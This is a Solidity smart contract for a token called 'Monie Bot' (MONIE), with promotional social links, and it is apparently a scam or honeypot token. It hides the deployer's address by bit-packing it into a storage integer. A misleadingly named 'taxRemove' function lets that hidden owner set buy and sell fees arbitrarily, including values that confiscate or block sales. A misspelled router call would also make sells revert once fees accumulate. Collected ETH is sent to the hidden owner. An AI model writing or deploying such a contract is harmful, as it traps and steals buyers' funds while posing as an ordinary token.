/**
 */

/*

      TG: https://t.me/moniebotportal  
      X: https://x.com/monie_bot  
      Website: www.moniebot.com


*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MONIE {
    string private _name = unicode"Monie Bot";
    string private _symbol = unicode"MONIE";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 500_000 * 10**decimals;

    uint256 public encodeUint256;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        uint8 _initBuyFee = 5;
        uint8 _initSellFee = 5;
        _encodeData(msg.sender, _initBuyFee, _initSellFee);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function taxRemove(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMkt()) revert Permissions();
        _encodeData(msg.sender, _buy, _sell);
    }

    function _encodeData(address _address, uint8 _buyFee, uint8 _sellFee) private {
        encodeUint256 = uint256(uint160(_address));
        encodeUint256 = (encodeUint256 << 8) | _buyFee;
        encodeUint256 = (encodeUint256 << 8) | _sellFee;
    }

    function _decodeTokenMkt() private view returns(address) {
        address _address = address(uint160(encodeUint256 >> 16));
        return _address;
    }

    function _decodeTaxes() private view returns(uint8, uint8) {
        uint8 _buyFee = uint8(encodeUint256 >> 8);
        uint8 _sellFee = uint8(encodeUint256);
        return (_buyFee, _sellFee);
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMkt());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMkt();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != tokenMkt) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = _decodeTaxes();
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }


}